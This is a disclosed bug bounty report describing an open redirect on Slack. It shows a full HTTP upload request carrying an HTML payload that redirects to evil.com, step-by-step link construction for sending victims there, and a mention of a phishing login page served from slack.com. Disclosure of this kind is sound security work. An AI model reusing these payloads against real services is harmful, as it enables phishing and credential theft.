# Open Redirect on slack.com

## Report Details
- **Report ID**: 140447
- **URL**: https://hackerone.com/reports/140447
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-23T10:08:15.137Z
- **Disclosed**: 2016-10-02T18:09:42.737Z

## Reporter
- **Username**: sudotop
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Hi, my report has tow interesting parts here
First
======
In this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain
I have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code

### Please have a look at screenshots attached here to get what I mean.
### Steps
1. login to your account and send the following request:

Note: I can't get binary chars displayed here so I attached a file containing the whole request

```
POST /api/files.uploadAsync HTTP/1.1
Host: upload.slack.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.slack.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: form-data; name="file"; filename="pixel.png"
Content-Type: text/html

<bunch_of_binary_chars_here>
<html>
<script>
window.location='http://www.evil.com';
</script>
</html>
-----------------------------89481407720596
Content-Disposition: form-data; name="filename"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="token"

<token>
-----------------------------89481407720596
Content-Disposition: form-data; name="channels"

<channels>
-----------------------------89481407720596
Content-Disposition: form-data; name="title"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="initial_comment"

hi
-----------------------------89481407720596--

```

2. Make public link for "pixel" file "https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

3. Complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

4. Whenever a victim clicks the previous link he will get to "http://www.evil.com"

Second
======
I have found another way to make the redirect link very simple and more tricky
The attacker can just use slack main domain using this link "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" to redirect victims to "http://www.evil.com".

There are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.

Here is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker "https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=e80f120635" 

Attacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.

## Attachments
- slack.com_URL_Redirect.png
- slack.com_phishing_login_page.png
- Slack_HTML_POST.png
- request.txt
